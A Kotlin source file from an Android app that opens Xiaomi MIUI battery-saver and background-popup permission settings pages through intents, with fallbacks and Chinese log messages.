package com.storm.safe.rock.service.modules.yw5xud.miui

import android.content.Intent
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService

/**
 * MiuiBatterySaver -- Legacy battery saver + background popup delegate.
 * These are fallback/legacy flows not used by the primary execute() chain,
 * but retained for backward compatibility and direct test invocation.
 *
 * Extracted from MiuiSteps.executeBatterySaver() + executeBackgroundPopup().
 */
class MiuiBatterySaver(
    private val service: MyAccessibilityService?,
    private val context: android.content.Context,
    private val ui: UiAutomation
) {
    /**
     * Navigate to battery saver settings and set to unrestricted.
     * Vendor: executeBatterySaver flow (legacy fallback)
     */
    fun executeBatterySaver(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = ui.launchComponent(MiuiConstants.BATTERY_COMPONENTS, useService = true)
            if (launched) {
                logs.add("已启动省电策略页面")
                successes.add("小米省电策略已打开")
            } else {
                // Fallback: open app info battery settings
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
                             Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                context.startActivity(intent)
                logs.add("已打开应用信息页面(回退)")
            }
        } catch (e: Exception) {
            failures.add("小米省电策略配置异常: ${e.message}")
        }
    }

    /**
     * Enable background popup permission.
     * Vendor: executeBackgroundPopup flow
     */
    fun executeBackgroundPopup(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            // Navigate to app permissions
            val intent = Intent("miui.intent.action.APP_PERM_EDITOR").apply {
                putExtra("extra_pkgname", context.packageName)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
                         Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已启动MIUI权限编辑器")
            successes.add("小米后台弹窗权限已打开")
        } catch (e: Exception) {
            // Fallback
            logs.add("MIUI权限编辑器启动失败, 跳过后台弹窗: ${e.message}")
        }
    }
}
